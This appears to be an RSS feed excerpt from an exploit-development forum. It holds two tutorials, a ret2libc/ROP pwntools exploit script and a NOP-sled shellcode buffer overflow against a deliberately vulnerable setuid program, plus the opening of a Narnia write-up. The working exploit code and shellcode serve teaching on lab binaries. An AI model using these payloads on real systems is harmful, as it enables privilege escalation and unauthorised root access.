<p><strong>The system() function is present in <code>0x7ffff782c440</code></strong><br>
<strong>Address of the string ‘/bin/sh’ is <code>0x7ffff7990e9a</code></strong></p>
<p><strong>These addresses are most likely different for your machine</strong></p>
<h2>Learning to write exploit scripts.</h2>
<p><strong>Sufficient knowledge of python is assumed, although not necessary to understand this section.</strong></p>
<p>There are a lot of ways to write your exploit scripts.<br>
I will keep things simple and write one in using <code>python3</code> and <a href="http://docs.pwntools.com/en/stable/" rel="nofollow noopener">pwntools</a></p>
<p>We will do everything we have done so far with gdb in python.</p>
<p>Create a new python script.</p>
<pre><code class="lang-auto">import pwn
import tty
</code></pre>
<p>You can install <code>pwntools</code> with pip and <code>import pwn</code> to work with it. We will also be using some constants from <code>tty</code></p>
<pre><code class="lang-auto">p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)

# g = pwn.gdb.attach(p, """
# """)
</code></pre>
<p>This is how you start a local process in <code>pwntools</code>. <strong>Note the <code>raw = False</code> and <code>stdin=pwn.PTY</code>!</strong><br>
These options are essential to our current project since we write EOF to stream and not close our stream. (Yes this sounds weird, but this is necessary.)<br>
You can experiment with attaching the debugger by uncommenting some lines here.</p>
<pre><code class="lang-auto">def setup():
    p.sendline('21')

def write_junk(count):
    for x in range(count):
        p.sendline('')

def overwrite_memory(addr, data):
    p.sendline('14')
    p.sendline('')
    p.sendline(str(addr))
    p.sendline(str(data))


def send_eof():
    """
    Note Send EOF sends 2 bytes!!!
    """
    p.sendline(chr(tty.CEOF))
</code></pre>
<p>These are some of the functions that will be useful to us. The functions are self-explanatory. If you have never written an exploit before with pwntools, feel free to experiment here. <code>p.sendline()</code> is used to send a line to the process.</p>
<pre><code class="lang-auto">
setup()
"""
Overwrite the GOT of puts for the ability to write memory many times
"""
write_junk(14)
# 0x40088e = calc_sum
# 0x601018 = GOT of puts
# Overwrite GOT of puts with calc_sum
overwrite_memory(0x601018 - 17*8, 0x40088e)
send_eof()

p.interactive()
</code></pre>
<p>Okay, so now that all that is over, we will first overwrite the GOT entry of <code>puts</code> with <code>calc_sum</code> so that we can use EOF to jump to it again. Our nifty little <code>overwrite_memory()</code> function makes this easier.</p>
<p>The <code>p.interactive()</code> at the end is used to make the process interactive. After this, you can use the terminal for IO.</p>
<p>I recommend you experiment with the script.</p>
<h2>Things that are necessary for the exploit to work.</h2>
<p>These are some things that will be useful to us as we move on to ROP.</p>
<ol>
<li>Overwrite the GOT entry of <code>__stack_chk_fail</code> to point to the <code>leaveq; ret</code> instruction in <code>calc_sum</code> to bypass stack smashing check.</li>
<li>Overwrite the value of n to 30 so that we can overwrite more memory at once. (This is used in the ROP step later)</li>
</ol>
<p>I will not show this in gdb since I have already shown you how to overwrite arbitrary memory, and the writeup will be pretty repetitive if I include this.</p>
<p>If you are confused, please refer to the code snippet below from the exploit script.</p>
<pre><code class="lang-auto">"""
Overwrite the GOT of __stack_chk_fail for beating the stack cookie
"""
write_junk(13)
# 0x601020 = GOT of __stack_chk_fail
# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
overwrite_memory(0x601020 - 17*8, 0x4009b3)
send_eof()

"""
Overwrite global n to overwrite more data on the stack
"""
write_junk(13)
# n = 0x6010b0
# Overwrite n with 30
overwrite_memory(0x6010b0 - 17*8, 30)
send_eof()

</code></pre>
<h2>Finding the necessary ROP gadgets</h2>
<p>I use <a href="https://github.com/JonathanSalwan/ROPgadget" rel="nofollow noopener">ROPgadget</a> tool to find the necessary ROP gadgets from the executable. You can use the plethora of alternatives available to you. (gdb-peda also has one!)</p>
<pre><code class="lang-auto">[gnik@tinybot ~/]$ 
ROPgadget --binary thebinary 
...
0x0000000000400a83 : pop rdi ; ret
...
0x0000000000400646 : ret
...

Unique gadgets found: 112

</code></pre>
<p>We will need two ROP gadgets, <code>pop rdi; ret</code> and <code>ret</code>.<br>
<code>pop rdi; ret</code> to load the address of the string into the <code>rdi</code> register and then <code>ret</code> gadget to align the stack address for the <code>movqs</code> instruction. (The reason this is necessary is left as an exercise.)</p>
<h2>Writing the final exploit script.</h2>
<p>We finally have all the tools that we need to write a final exploit script.</p>
<p>The final exploit script looks something like.</p>
<pre><code class="lang-auto">import pwn
import tty

p = pwn.process('./thebinary', stdin=pwn.PTY, raw = False)

#g = pwn.gdb.attach(p, """
#b *0x00000000004009b8
#c
#""")

def setup():
    p.sendline('21')

def write_junk(count):
    for x in range(count):
        p.sendline('')

def overwrite_memory(addr, data):
    p.sendline('14')
    p.sendline('')
    p.sendline(str(addr))
    p.sendline(str(data))


def send_eof():
    """
    Note Send EOF sends 2 bytes!!!
    """
    p.sendline(chr(tty.CEOF))


setup()
"""
Overwrite the GOT of puts for the ability to write memory many times
"""
write_junk(14)
# 0x40088e = calc_sum
# 0x601018 = GOT of puts
# Overwrite GOT of puts with calc_sum
overwrite_memory(0x601018 - 17*8, 0x40088e)
send_eof()


"""
Overwrite the GOT of __stack_chk_fail for beating the stack cookie
"""
write_junk(13)
# 0x601020 = GOT of __stack_chk_fail
# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
overwrite_memory(0x601020 - 17*8, 0x4009b3)
send_eof()

"""
Overwrite global n to overwrite more data on the stack
"""
write_junk(13)
# n = 0x6010b0
# Overwrite n with 30
overwrite_memory(0x6010b0 - 17*8, 30)
send_eof()


"""
Overwrite the stack with ROP chain for ret2libc
"""
write_junk(17)
p.sendline('24')
# 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
p.sendline("")
p.interactive()
</code></pre>
<p>Most of the script has already been discussed.<br>
Let us focus on the rest that remains.</p>
<pre><code class="lang-auto">"""
Overwrite the stack with ROP chain for ret2libc
"""
write_junk(17)
p.sendline('24')
# 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
p.sendline("")
p.interactive()
</code></pre>
<p><strong>The first question that needs to be answered: Why have some constants changed?</strong><br>
<code>write_junk(13)</code> was used while overwriting memory the last time why is <code>write_junk(17)</code> used this time?</p>
<p>This is due to the fact that <code>n = 21</code> in all previous cases but we have just recently overwritten <code>n = 30</code> so that we can overwrite more of the stack. Hence, the offsets at which the local variable <code>i</code> is overwritten has changed.<br>
You can experiment with the same method used above to figure out the offset when n = 30.</p>
<p>Okay, now let’s discuss the <strong>ROP</strong> part of the exploit.</p>
<pre><code class="lang-auto"># 0x400a83 : pop rdi ; ret
p.sendline(str(0x400a83))

# /bin/sh = 0x7ffff7990e9a
p.sendline(str(0x7ffff7990e9a))

# 0x00400646 = ret
# This is needed because the movaps instruction must be properly aligned.
p.sendline(str(0x00400646))

# system() = 0x7ffff782c440
p.sendline(str(0x7ffff782c440))
</code></pre>
<p>To set up our exploit, we overwrite the stack to the point where we can overwrite the return address.<br>
We then place the address of the <code>pop rdi; ret</code> ROP gadget followed by the address to the <code>/bin/sh</code> string.</p>
<p>When the function returns, it jumps to execute <code>pop rdi; ret</code>. Since the address of the string is on the stack, <code>pop rdi</code> places the address of the string in the rdi register. And then we <code>ret</code> to another address…</p>
<p>… The address we jump to is the address of <code>ret</code> instruction. <code>ret</code> gadget is used to align our stack. (This is necessary since movaps instruction (used by system()) needs the stack to be 16 bit aligned.). <code>ret</code> is a NOP in ROP (a gadget that does nothing).</p>
<p><strong>Note that this might not be necessary if your stack is already 16 bit aligned.</strong></p>
<p>We then place the address of the system call on the stack. The <code>ret</code> gadget then pops this address off the stack and then jumps to system() in libc.</p>
<p>We have successfully placed the address of the string ‘/bin/sh’ in <code>rdi</code> and then jumped to system()!</p>
<p><strong>Wait… There is more…</strong><br>
Remember we overwrote the GOT entry of __stack_chk__fail so that the stack cookie check would unconditionally return to <code>leaveq; ret</code><br>
Since we have overwritten the return address, we have surely overwritten the stack cookie.<br>
Therefore, if we hadn’t overwritten the GOT entry of <code>__stack_chk_fail</code> our exploit would have failed.</p>
<p><strong>We can also overwrite a GOT entry and jump using that to avoid this</strong>.</p>
<h2>Putting it all together</h2>
<pre><code class="lang-auto">[gnik@tinybot ~/]$ python3 exploit.py
[+] Starting local process './thebinary': pid 18969
[*] Switching to interactive mode
n = 21
....
....
SUM = -3105548685935727921
$ $ whoami
whoami
gnik
</code></pre>
<p><strong>This is my first post here in 0x00sec, so any feedback would be helpful. In an upcoming writeup, we will exploit the same executable but with ASLR enabled. : )</strong></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751</link>
          <pubDate>Wed, 11 Mar 2020 04:42:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19751</guid>
          <source url="https://0x00sec.org/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss">Punishing code with magic numbers with ROP and ret2libc on an x86_64</source>
        </item>
        <item>
          <title>Buffer Overflow to Run Root Shell</title>
          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Buffer Overflow Basics</h1>
<h3>Overview</h3>
<p>Buffer overflows were an earth-shattering vulnerability exploited in the late 1980’s that are protected against on modern systems. That said, they are still relevant, and pave the way to learning more advanced exploits.</p>
<p>This vulnerable program is implemented in C++.</p>
<h3>What is a buffer?</h3>
<p>Arrays allocate storage space in what is called a <em>buffer</em> .</p>
<p>Syntax: <code>type array[buffer_length];</code></p>
<p>Ex: <code>char input[50]; // An array of up to 50 characters.</code><br>
<code>Variable = input [49] // max</code><br>
<code>Variable = input [250] // accessing memory outside the array</code></p>
<h3>The Stack</h3>
<p>All variables are stored in RAM allocated per-program in a <strong>stack frame</strong> .</p>
<p>Ex:</p>
<pre><code class="lang-auto">fxn() {  
  array[50]  
  return // overwritten  
}  

main() {  
  var1  
  fxn()  
}  
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82.png" data-download-href="/uploads/short-url/u4ijrbdmIhaiaEC6PhLTEUnHqPE.png?dl=1" title="stack.png"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_204x413.png" alt="stack.png" data-base62-sha1="u4ijrbdmIhaiaEC6PhLTEUnHqPE" width="204" height="413" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_204x413.png, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_306x619.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_408x826.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d2bd851ebfdc1aeab1c131cd00a6249fa7285c82_2_10x10.png"></a></div><p></p>
<h3>Registers</h3>
<p>EBP: Extended Base Pointer</p>
<ul>
<li>Points to base of the stack</li>
</ul>
<p>ESP: Extended Stack Pointer</p>
<ul>
<li>Points to the top of the stack</li>
</ul>
<p>EIP: Extended Instruction Pointer</p>
<ul>
<li>Return address</li>
</ul>
<h3>How do we Exploit This?</h3>
<p>We can feed any memory address within the stack into the EIP. The program will execute instructions at that memory address. We can put our own <em>shellcode</em> into the stack, put the address to the start of the shellcode at the EIP, and the program will execute the shellcode. Shellcode is a collection of operation codes (written in hex) whose goal is to open a root shell instance.</p>
<h3>The Actual Hack</h3>
<p>Instead of returning <em>exactly</em> where our shellcode starts, we can put no operation (NOP) hex instructions (0x90) into the stack.</p>
<ol>
<li>Write past array buffer ending.</li>
<li>Find where we want our address to return to (somewhere in the NOP region).</li>
<li>Overwrite return address at EIP with our address.</li>
<li>Don’t write past EIP!</li>
</ol>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/9/91b8cbdc3394c801290063600147221ae418a64f.png" data-download-href="/uploads/short-url/kN79Lwg4dS6UYi0Bd6KZIkUfGvt.png?dl=1" title="hacked_stack.png"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_224x402.png" alt="hacked_stack.png" data-base62-sha1="kN79Lwg4dS6UYi0Bd6KZIkUfGvt" width="224" height="402" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_224x402.png, https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_336x603.png 1.5x, /uploads/default/original/2X/9/91b8cbdc3394c801290063600147221ae418a64f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/91b8cbdc3394c801290063600147221ae418a64f_2_10x10.png"></a></div><p></p>
<h1>Demo</h1>
<h3>Setup</h3>
<ol>
<li>Get on a Linux system if you want to follow along with this one.</li>
<li>First, you can download our <a href="https://www.danielmills.org/downloads/buffer_overflow/escalate.cpp" rel="noopener nofollow ugc">vulnerable program</a> and the <a href="https://www.danielmills.org/downloads/buffer_overflow/shellcode.txt" rel="noopener nofollow ugc">shellcode</a> we’ll be using.</li>
<li>Disable <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="noopener nofollow ugc">ASLR</a> (must be root to do this):<br>
<code>echo "0" &gt; /proc/sys/kernel/randomize_va_space</code>
</li>
<li>Compile disabling buffer protections:<br>
<code>g++ escalate.cpp -o escalate -m32 -fno-stack-protector -z execstack</code>
</li>
<li>Give root permissions (must be root to do this - you can try <code>sudo -i</code> ):<br>
<code>chown root:root escalate</code> <code>chmod u+s escalate</code>
</li>
<li>Give this file to a user that doesn’t have root permissions. My non-root user is called hax for this demo. Type <code>ls -l</code> to double check that the permissions are aligned:</li>
</ol>
<p><img src="/uploads/default/original/2X/3/36c843ff2c1fadad1d6e8c4237d868deff8b6c5b.png" alt="1.PNG" data-base62-sha1="7OCQJjWyqacBaFQuYVdMeQtXOj1" width="509" height="24"></p>
<p>Now we can start trying to exploit the program! As reference, here is the source code:</p>
<pre><code class="lang-auto">#include &lt;iostream&gt;  
#include &lt;cstring&gt;  

void vulnerable(char *tmp) {  
    char input[400];  
    strcpy(input,tmp); //copies a malicious string into the character buffer  
}  

int main(int argc, char* argv[]) {  
    if (argc != 2) { //error message if run improperly  
        std::cout &lt;&lt; "Usage: ./prog argn";  
        return 1;  
    }  
    vulnerable(argv[1]); //passes our input to the vulnerable function  
    return 0;  
}  
</code></pre>
<h3>Hacking Time!</h3>
<p>To review, we know:</p>
<ol>
<li>The buffer is 400 characters long</li>
<li>The first command line argument we type in will be copied into that buffer.</li>
</ol>
<p>Here’s how I started poking around:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png" data-download-href="/uploads/short-url/engc4dvqqlzIDjA0BYgxen6BAzN.png?dl=1" title="2.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_690x92.png" alt="2.PNG" data-base62-sha1="engc4dvqqlzIDjA0BYgxen6BAzN" width="690" height="92" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_690x92.png, /uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png 1.5x, /uploads/default/original/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64bf9334eb4cb64d340c1d5fb37e7dea8502db93_2_10x10.png"></a></div><p></p>
<p>You can use python (or another scripting language, like perl) to run in the command line. I am telling python to print a 400 character long string of “AAAAAA…” into the terminal as an argument to our vulnerable program. The syntax for doing so is this:<br>
<code>python -c 'print "A"*400'</code><br>
The backticks make python evaluate whatever you input before running our program.</p>
<p>As you can see, we get a segmentation fault at 408 characters. If you remember back to my speil earlier, we don’t want to write past the EIP, so lets check the value of the EIP by loading this crash scenario into GDB with the following command:<br>
<code>gdb -q --args ./escalate </code>python -c ‘print “A”*408’`` . Then type <code>run</code> .</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png" data-download-href="/uploads/short-url/aW7orbW4YJuPLsw2vt4zmNi0F01.png?dl=1" title="3.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_690x282.png" alt="3.PNG" data-base62-sha1="aW7orbW4YJuPLsw2vt4zmNi0F01" width="690" height="282" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_690x282.png, /uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png 1.5x, /uploads/default/original/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ca79c988ad936b4c2bb1813ac985a55a16000a5_2_10x10.png"></a></div><p></p>
<p>The value “A” in hex is 41, so as you can see, the EIP has not been overwritten. One good thing to note is that gdb handily tells you the EIP’s value in blue without you needing to type the <code>info reg eip</code> command. For the rest of the tutorial, I expect you to look at the value in blue to track with me.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png" data-download-href="/uploads/short-url/jJyJBEloDxW4arrRIDK5vBRf556.png?dl=1" title="4.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_690x264.png" alt="4.PNG" data-base62-sha1="jJyJBEloDxW4arrRIDK5vBRf556" width="690" height="264" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_690x264.png, /uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png 1.5x, /uploads/default/original/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8a4fbdbda24c774002399ed64a34df5e94b470c8_2_10x10.png"></a></div><p></p>
<p>After a little trial and error, I found that 416 is the magic number to overwrite the EIP completely without going over. To illustrate this, I wrote 412 values of A into the buffer (41 in hex) and 4 values “BCDE” at the end (42, 43, 44, 45 in hex). As you can see, the EIP has the value <code>45444342</code> in it. It has reversed order because my pc stores data in a little endian way - as do most.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png" data-download-href="/uploads/short-url/yMjIIDOBMJC2PQNOxyF0O6Up2X7.png?dl=1" title="5.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_690x265.png" alt="5.PNG" data-base62-sha1="yMjIIDOBMJC2PQNOxyF0O6Up2X7" width="690" height="265" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_690x265.png, /uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png 1.5x, /uploads/default/original/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3c0285ef93a6d6d6ffcadafa3510ad3c48c26d1_2_10x10.png"></a></div><p></p>
<p>Now it’s time to look at the stack to find a good return address for our exploit. The gdb command <code>x/32z $esp</code> will display 32 DWORDs of the stack at a time.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png" data-download-href="/uploads/short-url/vBY3JHeRQkvNUaJFLwKTJhOgwio.png?dl=1" title="6.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_690x317.png" alt="6.PNG" data-base62-sha1="vBY3JHeRQkvNUaJFLwKTJhOgwio" width="690" height="317" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_690x317.png, /uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png 1.5x, /uploads/default/original/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd8e24873dbf52901ef565020712ae01cc75db34_2_10x10.png"></a></div><p></p>
<p>Hit enter to keep scrolling at this rate. You should see a ton of 41s on the stack from our input. The address I highlighted is near the top end of the buffer. It will be a good address to return to in the middle of our NOP region (refer to the earlier picture to see how we will structure this exploit). If you are following along, your address will likely be different.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png" data-download-href="/uploads/short-url/v5dNBYikUBZg4QeAKeSl8XsXAmN.png?dl=1" title="7.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_690x362.png" alt="7.PNG" data-base62-sha1="v5dNBYikUBZg4QeAKeSl8XsXAmN" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_690x362.png, /uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png 1.5x, /uploads/default/original/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9da8693116c7e176a39347b0bcb4ecad8a2a11d_2_10x10.png"></a></div><p></p>
<p>If we scroll a little farther down the stack, we see the value we overwrote the EIP with.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png" data-download-href="/uploads/short-url/egGOhh4AVZDwDK7tVHL795nupjn.png?dl=1" title="8.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_690x374.png" alt="8.PNG" data-base62-sha1="egGOhh4AVZDwDK7tVHL795nupjn" width="690" height="374" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_690x374.png, /uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png 1.5x, /uploads/default/original/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64016e18c2d47b3ec957876c4a8eec1f8c7325b5_2_10x10.png"></a></div><p></p>
<p>Now, let’s slow down a little bit and structure our attack. I don’t want to lose you in this somewhat confusing process!</p>
<ol>
<li>We know that the region of 41s on the stack is our entire buffer up to the EIP</li>
<li>The value BCDE is what the EIP will be overwritten with.</li>
<li>Our return address is 0xffffd480</li>
</ol>
<p>What we need to find is the length of our shellcode so we can split the remaining 412 character length of the buffer into NOP and the shellcode while keeping it the same length. I call an instance of python in the terminal (yes, I know 2.7 is outdated haha!) and find the length of our shellcode. It is 53 bytes long.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png" data-download-href="/uploads/short-url/6jWBpiFvKAnjIkk3dl8syYrent8.png?dl=1" title="9.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_690x151.png" alt="9.PNG" data-base62-sha1="6jWBpiFvKAnjIkk3dl8syYrent8" width="690" height="151" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_690x151.png, /uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png 1.5x, /uploads/default/original/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2c4e3967a4f200b62d6e1d7956bc3bdd0bf6f0aa_2_10x10.png"></a></div><p></p>
<p>buffer: 412 bytes<br>
shellcode: 53<br>
NOP: 412 - 53 = 359 bytes<br>
return address: 4 bytes</p>
<p>The no operation (NOP) instruction is <code>0x90</code> for 64 bit Intel architecture processors.</p>
<p>So now our attack string looks like:<br>
<code>./escalate </code>python -c 'print “\x90”*359 +<br>
“\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh”</p>
<ul>
<li>“\x80\xd4\xff\xff”’``</li>
</ul>
<p>We use <code>\x</code> to denote to python that the following number is a hex number instead of printable characters.<br>
If we load this into gdb, we get the following result:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png" data-download-href="/uploads/short-url/w2tRde4VditdqowKZCAM0T1GC7O.png?dl=1" title="10.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_690x330.png" alt="10.PNG" data-base62-sha1="w2tRde4VditdqowKZCAM0T1GC7O" width="690" height="330" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_690x330.png, /uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png 1.5x, /uploads/default/original/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e08d613cda999bc14c9b758ef7db40d13c207a5c_2_10x10.png"></a></div><p></p>
<p>Gdb is not escalated to root permissions, so we get a user level shell (I am still the user hax). However, if we run this outside of gdb, we get a root shell instance:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png" data-download-href="/uploads/short-url/tonndo1OejTBwuBs8e3xGjwxwyq.png?dl=1" title="11.PNG"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_690x230.png" alt="11.PNG" data-base62-sha1="tonndo1OejTBwuBs8e3xGjwxwyq" width="690" height="230" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_690x230.png, /uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png 1.5x, /uploads/default/original/2X/c/ce007957fde478deec2efce19ca246624ac2a76e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/ce007957fde478deec2efce19ca246624ac2a76e_2_10x10.png"></a></div><p></p>
<p>It worked! The root shell is denoted by the <code>#</code> and I show that I can now edit the passwd file. <code>whoami</code> returns <code>root</code> as the user.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/buffer-overflow-to-run-root-shell/18629">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/buffer-overflow-to-run-root-shell/18629</link>
          <pubDate>Thu, 16 Jan 2020 20:58:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18629</guid>
          <source url="https://0x00sec.org/t/buffer-overflow-to-run-root-shell/18629.rss">Buffer Overflow to Run Root Shell</source>
        </item>
        <item>
          <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
          <dc:creator><![CDATA[chivato]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>OverTheWire Narnia challenges 0-4 Writeups</h1>
<p>In this post I will be writing up challenges 0-4 from the Narnia series on OverTheWire, with the best explanation I can come up with for each, so someone that has no understanding of pwn, can get a base, and play the challenges for themselves.</p>
